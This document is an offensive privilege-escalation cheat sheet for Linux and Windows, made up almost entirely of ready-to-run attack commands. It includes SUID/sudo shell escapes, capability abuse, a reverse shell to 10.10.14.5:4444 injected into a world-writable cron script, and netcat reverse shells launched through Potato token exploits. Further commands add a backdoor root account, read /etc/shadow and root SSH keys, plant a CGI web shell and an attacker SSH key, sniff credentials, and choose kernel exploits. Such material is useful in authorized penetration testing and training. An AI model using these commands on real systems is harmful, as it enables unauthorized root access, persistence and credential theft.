# Advanced Privilege Escalation Techniques

## Living-off-the-Land Privesc — GTFOBins Deep Dive

### Less Common SUID/Sudo Binaries

Most operators check the usual suspects (vim, find, python). These binaries are frequently
overlooked by both attackers and defenders.

#### doas (OpenBSD sudo alternative)
```bash
# If doas is SUID or user has doas.conf entry
doas /bin/sh
# Check config:
cat /usr/local/etc/doas.conf
# permit nopass <user> as root cmd /bin/sh
```

#### run-parts
```bash
# SUID run-parts — runs all executables in a directory
# Create a directory with a malicious script
mkdir /tmp/privesc
echo '#!/bin/sh' > /tmp/privesc/exploit
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/privesc/exploit
chmod +x /tmp/privesc/exploit
run-parts /tmp/privesc
/tmp/rootbash -p

# With sudo
sudo run-parts --regex '.*' /tmp/privesc
```

#### taskset
```bash
# SUID taskset — sets CPU affinity then executes command
taskset 1 /bin/sh -p

# With sudo
sudo taskset 1 /bin/sh
```

#### cpulimit
```bash
# If SUID — monitors a process and can exec
cpulimit -l 100 -f -- /bin/sh -p

# With sudo
sudo cpulimit -l 100 -f -- /bin/sh
```

#### env
```bash
# SUID env — executes a command with modified environment
env /bin/sh -p

# With sudo
sudo env /bin/sh
```

#### timeout
```bash
# SUID timeout — runs command with time limit
timeout 7d /bin/sh -p

# With sudo
sudo timeout 7d /bin/sh
```

#### strace
```bash
# SUID strace — trace system calls, can exec
strace -o /dev/null /bin/sh -p

# With sudo — attach to running root process
sudo strace -o /dev/null -p $(pgrep -n -u root)
# Or just exec a shell
sudo strace -o /dev/null /bin/sh
```

#### ltrace
```bash
# SUID ltrace — library call tracer
ltrace -b -L /bin/sh -p

# With sudo
sudo ltrace -b -L /bin/sh
```

#### gdb
```bash
# SUID gdb — debugger with full process control
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit

# With sudo — spawn root shell
sudo gdb -nx -ex '!sh' -ex quit

# Attach to root process and inject
sudo gdb -p $(pgrep -n -u root cron)
# In GDB:
# (gdb) call (void)system("/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'")
# (gdb) detach
# (gdb) quit
# Then: /tmp/rootbash -p
```

#### Other overlooked binaries
```bash
# busybox (if SUID)
busybox sh -p

# ionice
sudo ionice /bin/sh

# nice
sudo nice /bin/sh

# unshare
sudo unshare /bin/sh

# setarch
sudo setarch $(arch) /bin/sh

# watch
sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'

# expect
sudo expect -c 'spawn /bin/sh;interact'

# ed (text editor)
sudo ed
!/bin/sh

# rlwrap
sudo rlwrap /bin/sh

# screen (if SUID)
screen -x     # attach to root session if exists
```

---

### Capability-Based Abuse

#### cap_dac_override (bypass file read/write/exec permission checks)
```bash
# Discovery
getcap -r / 2>/dev/null | grep cap_dac_override

# With python3 + cap_dac_override — write to /etc/passwd directly
/usr/bin/python3 -c '
import os
line = "hacker:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash\n"
with open("/etc/passwd", "a") as f:
    f.write(line)
'
su hacker  # password: password123

# With vim + cap_dac_override — edit /etc/shadow
vim /etc/shadow
# Replace root's hash with: $1$salt$qJH7.N4xYta3aEG/dfqo/0
```

#### cap_setuid (change UID to any user)
```bash
# Discovery
getcap -r / 2>/dev/null | grep cap_setuid

# python3
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# ruby
/usr/bin/ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# php
/usr/bin/php -r 'posix_setuid(0); system("/bin/bash");'

# node
/usr/bin/node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'

# gdb with cap_setuid
/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!bash' -ex quit
```

#### cap_net_raw (raw sockets — network sniffing)
```bash
# Discovery
getcap -r / 2>/dev/null | grep cap_net_raw

# Sniff credentials off the wire
/usr/bin/tcpdump -i eth0 -A -s 0 'port 21 or port 80 or port 110 or port 143' -w /tmp/creds.pcap

# Python scapy sniffing
/usr/bin/python3 -c '
from scapy.all import *
def pkt_callback(pkt):
    if pkt.haslayer(Raw):
        load = pkt[Raw].load.decode("utf-8","ignore")
        if "PASS" in load or "password" in load.lower():
            print(f"[!] {pkt[IP].src} -> {pkt[IP].dst}: {load.strip()}")
sniff(filter="tcp port 21 or tcp port 80 or tcp port 110", prn=pkt_callback, store=0)
'
```

#### cap_sys_ptrace (trace/inject into processes)
```bash
# Inject into a root process to execute commands
# Find root process
ps -eo pid,user,comm | grep root

# Python injection via /proc/<pid>/mem
/usr/bin/python3 << 'PYEOF'
import ctypes, sys, struct

pid = int(sys.argv[1]) if len(sys.argv) > 1 else 1

libc = ctypes.CDLL("libc.so.6")
# ptrace ATTACH
libc.ptrace(16, pid, None, None)  # PTRACE_ATTACH
libc.waitpid(pid, None, 0)
# Read /proc/pid/maps to find libc base, inject shellcode
# ... (complex — use gdb or pince for practical injection)
libc.ptrace(17, pid, None, None)  # PTRACE_DETACH
PYEOF

# Simpler: gdb attach to root process
gdb -p $(pgrep -n -u root cron) -batch -ex 'call (void)system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash")'
/tmp/rootbash -p
```

---

## Chained Privesc — Combining Low-Severity Misconfigs

### Chain 1: World-Writable Cron Script + Writable PATH
```bash
# Discovery
cat /etc/crontab
# Output: * * * * * root /opt/scripts/backup.sh
ls -la /opt/scripts/backup.sh
# Output: -rwxrwxrwx 1 root root ... /opt/scripts/backup.sh  ← world-writable!

# Inject reverse shell into writable cron script
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/scripts/backup.sh
# Wait for cron execution (check with pspy if interval unknown)

# Alternative if script isn't writable but uses relative commands:
cat /opt/scripts/backup.sh
# Contains: tar czf /backup/daily.tar.gz /var/www
echo $PATH | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "WRITABLE: $d"; done
# WRITABLE: /usr/local/bin (writable by group 'staff', current user is in 'staff')
echo '#!/bin/bash' > /usr/local/bin/tar
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /usr/local/bin/tar
chmod +x /usr/local/bin/tar
# Cron runs script → script calls 'tar' → finds our /usr/local/bin/tar first
/tmp/rootbash -p
```

### Chain 2: Sudo NOPASSWD on vim + Shell Escape
```bash
# Discovery
sudo -l
# Output: (ALL) NOPASSWD: /usr/bin/vim /var/log/syslog

# Even though vim is restricted to a specific file, shell escape works
sudo vim /var/log/syslog
# Inside vim:
:!/bin/bash
# Root shell obtained

# If vim is restricted with --restricted flag:
# Try: :set shell=/bin/bash  then  :shell
# Try: :py3 import os; os.system("/bin/bash")
# Try: :lua os.execute("/bin/bash")
```

### Chain 3: NFS no_root_squash + SUID Binary Creation
```bash
# Discovery on target
cat /etc/exports
# /home/backup *(rw,no_root_squash)

# From attacker as root
mkdir /tmp/nfs
mount -t nfs <target_ip>:/home/backup /tmp/nfs

# Compile SUID shell
cat > /tmp/nfs/suid.c << 'EOF'
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
EOF
gcc /tmp/nfs/suid.c -o /tmp/nfs/suid
chmod u+s /tmp/nfs/suid
chown root:root /tmp/nfs/suid

# On target as low-priv user
/home/backup/suid
# Root shell — SUID is preserved because no_root_squash
```

### Chain 4: Writable systemd Service + Timer Trigger
```bash
# Discovery
find /etc/systemd /usr/lib/systemd -writable 2>/dev/null
# Found: /etc/systemd/system/backup.service is writable

cat /etc/systemd/system/backup.service
# [Service]
# ExecStart=/opt/backup/run.sh

# Modify ExecStart
cat > /etc/systemd/system/backup.service << 'EOF'
[Unit]
Description=Backup Service

[Service]
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
EOF

# Wait for timer to trigger or if we can reload:
# (usually requires root, but some systems have polkit rules allowing service restart)
systemctl daemon-reload 2>/dev/null
systemctl restart backup.service 2>/dev/null
# If reload fails, wait for scheduled timer execution
/tmp/rootbash -p
```

---

## Windows Token Abuse — Potato Family Comparison

### Matrix: Which Potato for Which Windows

| Exploit | Win 7 | Win 8/8.1 | Win 10 (1607-1809) | Win 10 (1903+) | Win 11 | Server 2008-2012 | Server 2016 | Server 2019 | Server 2022 |
|---------|-------|-----------|---------------------|----------------|--------|-------------------|-------------|-------------|-------------|
| JuicyPotato | ✅ | ✅ | ✅ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ |
| RoguePotato | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ✅ | ✅ | ❌ |
| PrintSpoofer | ❌ | ❌ | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| SweetPotato | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| GodPotato | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |

### SeImpersonatePrivilege vs SeAssignPrimaryTokenPrivilege

**SeImpersonatePrivilege** — allows impersonation of client tokens after authentication
- Default holders: IIS AppPool (Network Service, ApplicationPoolIdentity), MSSQL, local service accounts
- All Potato attacks abuse this
- Most common in web server and database contexts

**SeAssignPrimaryTokenPrivilege** — allows assigning a primary token to a new process
- Default holders: Local Service, Network Service
- Used by: JuicyPotato (with -t * flag), SweetPotato
- Fallback when SeImpersonate is stripped

### Usage Commands
```powershell
# JuicyPotato (needs valid CLSID for the OS version)
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c C:\temp\nc.exe -e cmd.exe 10.10.14.5 4444" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
# CLSID list: https://ohpe.it/juicy-potato/CLSID/

# RoguePotato (requires attacker-controlled machine for OXID resolution)
# On attacker: socat tcp-listen:135,reuseaddr,fork tcp:<target_ip>:9999
.\RoguePotato.exe -r <attacker_ip> -e "cmd.exe /c whoami > C:\temp\proof.txt" -l 9999

# PrintSpoofer (simplest — no external dependencies)
.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -i -c "C:\temp\nc.exe -e cmd.exe 10.10.14.5 4444"

# SweetPotato (tries multiple techniques automatically)
.\SweetPotato.exe -p C:\temp\nc.exe -a "-e cmd.exe 10.10.14.5 4444"

# GodPotato (broadest modern coverage)
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET2.exe -cmd "C:\temp\nc.exe -e cmd.exe 10.10.14.5 4444"
```

### Decision Flow
```
whoami /priv → SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege?
    │
    ├── Yes → Check Windows version (systeminfo)
    │   ├── Win 10 1903+ or Server 2019+ → PrintSpoofer or GodPotato
    │   ├── Win 10 pre-1903 or Server 2016 → JuicyPotato
    │   ├── Unsure / mixed env → SweetPotato (tries all)
    │   └── Need outbound (RoguePotato) → only if PrintSpoofer/GodPotato fail
    │
    └── No → Check other privesc paths (services, scheduled tasks, etc.)
```

---

## Third-Party Software Privesc

### MySQL Running as Root — UDF Exploitation
```bash
# Check if MySQL is running as root
ps aux | grep mysql
# If running as root AND we have MySQL creds:

# Check plugin directory and secure_file_priv
mysql -u root -p -e "SHOW VARIABLES LIKE 'plugin_dir';"
mysql -u root -p -e "SHOW VARIABLES LIKE 'secure_file_priv';"

# Compile UDF shared object (on Kali, match target arch)
# Source: sqlmap/data/udf/linux/64/lib_mysqludf_sys.so_
# Or compile from: https://github.com/mysqludf/lib_mysqludf_sys

# Upload UDF to plugin directory
mysql -u root -p << 'SQL'
USE mysql;
CREATE TABLE pwn(line BLOB);
INSERT INTO pwn VALUES(LOAD_FILE('/tmp/lib_mysqludf_sys.so'));
SELECT * FROM pwn INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
SQL

/tmp/rootbash -p
```

### PostgreSQL COPY TO PROGRAM
```bash
# Requires PostgreSQL superuser (often 'postgres')
# Available in PostgreSQL 9.3+

psql -U postgres -h localhost << 'SQL'
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
-- If running as root:
COPY cmd_exec FROM PROGRAM 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash';
DROP TABLE cmd_exec;
SQL

# Alternative via large object:
psql -U postgres -h localhost -c "SELECT lo_import('/etc/shadow');"
```

### Apache mod_cgi (CGI-enabled web server)
```bash
# If Apache runs as root (rare but happens) or www-data needs escalation
# And CGI is enabled with writable cgi-bin

cat > /usr/lib/cgi-bin/cmd.sh << 'EOF'
#!/bin/bash
echo "Content-type: text/html"
echo ""
$(/bin/bash -c "$QUERY_STRING")
EOF
chmod +x /usr/lib/cgi-bin/cmd.sh

# Execute via HTTP
curl "http://localhost/cgi-bin/cmd.sh?id"
curl "http://localhost/cgi-bin/cmd.sh?cat%20/etc/shadow"
```

### Docker Group Abuse
```bash
# Check if current user is in docker group
id | grep docker

# Mount host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt bash

# Or add SSH key for root persistence
docker run -v /:/mnt --rm alpine sh -c 'echo "ssh-rsa AAAA... attacker@kali" >> /mnt/root/.ssh/authorized_keys'

# Or overwrite /etc/shadow
docker run -v /etc:/mnt --rm alpine sh -c 'cat /mnt/shadow'

# No alpine image? Use any available image:
docker images
docker run -v /:/mnt --rm -it <any_image> chroot /mnt sh
```

### LXD/LXC Group Abuse
```bash
# Check group membership
id | grep lxd

# Build Alpine image on attacker
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder && sudo bash build-alpine

# Transfer .tar.gz to target, then:
lxc image import ./alpine-v3.19-x86_64.tar.gz --alias privesc
lxc init privesc privesc-container -c security.privileged=true
lxc config device add privesc-container host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc-container
lxc exec privesc-container /bin/sh
# Inside container: chroot /mnt/root /bin/bash → root on host
```

### disk Group Abuse (debugfs)
```bash
# Check group membership
id | grep disk

# Direct block device access via debugfs
debugfs /dev/sda1
# debugfs: cat /etc/shadow
# debugfs: cat /root/.ssh/id_rsa

# Or dump with dd
df -h  # find root partition
dd if=/dev/sda1 bs=1 skip=<offset> count=<size>  # requires knowing file offsets

# Simpler: debugfs gives full filesystem read access
debugfs -R 'cat /root/.ssh/authorized_keys' /dev/sda1
debugfs -R 'cat /etc/shadow' /dev/sda1
```

### video Group
```bash
# Can read framebuffer — screenshot the current console
id | grep video
cat /dev/fb0 > /tmp/screenshot.raw
# Get screen resolution
cat /sys/class/graphics/fb0/virtual_size
# Convert: ffmpeg -f rawvideo -pix_fmt bgra -s 1920x1080 -i /tmp/screenshot.raw screenshot.png
```

### adm Group
```bash
# Can read log files — may contain credentials
id | grep adm
grep -rni "password\|passwd\|credential\|secret" /var/log/ 2>/dev/null
cat /var/log/auth.log | grep -i "password"
```

---

## Kernel Exploit Selection Matrix

### Linux Kernel Exploits

| CVE | Name | Kernel Range | Reliability | Detection Risk | Notes |
|-----|------|-------------|-------------|----------------|-------|
| CVE-2021-4034 | PwnKit | polkit < 0.120 (2009-2022) | ⭐⭐⭐⭐⭐ Stable | 🟡 Low-Med | pkexec based, no kernel panic risk |
| CVE-2021-3156 | Baron Samedit | sudo 1.8.2-1.9.5p1 | ⭐⭐⭐⭐⭐ Stable | 🟡 Low-Med | Userland, no crash risk |
| CVE-2022-0847 | DirtyPipe | 5.8 - 5.16.11 | ⭐⭐⭐⭐ Reliable | 🟢 Low | Pipe splice, clean exploit |
| CVE-2023-0386 | OverlayFS | 5.11 - 6.2 | ⭐⭐⭐⭐ Reliable | 🟡 Medium | Requires 2 terminals |
| CVE-2023-2640 | GameOver(lay) | Ubuntu-specific | ⭐⭐⭐⭐ Reliable | 🟢 Low | One-liner, Ubuntu only |
| CVE-2023-4911 | Looney Tunables | glibc 2.34-2.38 | ⭐⭐⭐ Good | 🟡 Medium | glibc loader overflow |
| CVE-2022-25636 | Netfilter | 5.4 - 5.6.10 | ⭐⭐ Risky | 🔴 High | Heap overflow, can panic |
| CVE-2016-5195 | DirtyCow | 2.6.22 - 4.8.3 | ⭐⭐ Risky | 🔴 High | Race condition, can corrupt |
| CVE-2022-2586 | nft_object UAF | 5.12 - 5.18.x | ⭐⭐ Risky | 🔴 High | Use-after-free, crash risk |

### Selection Priority
```
1. Check PwnKit first (almost always works, no crash risk)
2. Check Baron Samedit (sudo version, no crash risk)
3. Check DirtyPipe/GameOverlay (clean kernel exploits)
4. Check OverlayFS (needs specific setup but reliable)
5. Last resort: DirtyCow / Netfilter / nft_object (crash risk — get approval)
```

### Windows Kernel/System Exploits

| CVE | Name | Windows Versions | Reliability | Detection Risk | Notes |
|-----|------|-----------------|-------------|----------------|-------|
| - | PrintSpoofer | 10/11, Server 2016-2022 | ⭐⭐⭐⭐⭐ Stable | 🟡 Medium | Token based, no BSOD |
| - | GodPotato | 8-11, Server 2012-2022 | ⭐⭐⭐⭐⭐ Stable | 🟡 Medium | Token based, no BSOD |
| CVE-2021-1675 | PrintNightmare | 7-11, Server 2008-2022 | ⭐⭐⭐⭐ Reliable | 🔴 High | Driver load, may EDR alert |
| CVE-2021-36934 | HiveNightmare | Win 10 1809-21H1 | ⭐⭐⭐⭐ Reliable | 🟡 Medium | Reads shadow copies |
| MS17-010 | EternalBlue | 7, Server 2008 R2 | ⭐⭐ Risky | 🔴 Very High | BSOD risk, AV flagged |
| - | KrbRelayUp | Domain-joined | ⭐⭐⭐ Good | 🔴 High | Requires AD conditions |

### Compile Tips for Kernel Exploits
```bash
# Standard compile on Kali
gcc exploit.c -o exploit -static -pthread

# If target has no gcc — cross-compile
# For x86_64 target:
gcc -static -o exploit exploit.c

# For 32-bit target:
gcc -m32 -static -o exploit exploit.c

# If compile fails — check if precompiled binaries exist
# Many CVE repos ship precompiled ELF binaries

# Transfer methods (pick what's available)
# HTTP: python3 -m http.server 8080  →  wget http://attacker:8080/exploit
# Netcat: nc -lvp 9999 < exploit  →  nc attacker 9999 > exploit
# Base64: base64 exploit | tr -d '\n'  →  echo '<b64>' | base64 -d > exploit

# Check kernel protections before running
grep -i smep /proc/cpuinfo           # Supervisor Mode Exec Prevention
grep -i smap /proc/cpuinfo           # Supervisor Mode Access Prevention
cat /proc/sys/kernel/randomize_va_space  # ASLR (0=off, 1=partial, 2=full)
cat /proc/sys/kernel/kptr_restrict       # Kernel pointer restriction
dmesg 2>/dev/null | grep -i "secure boot"
```
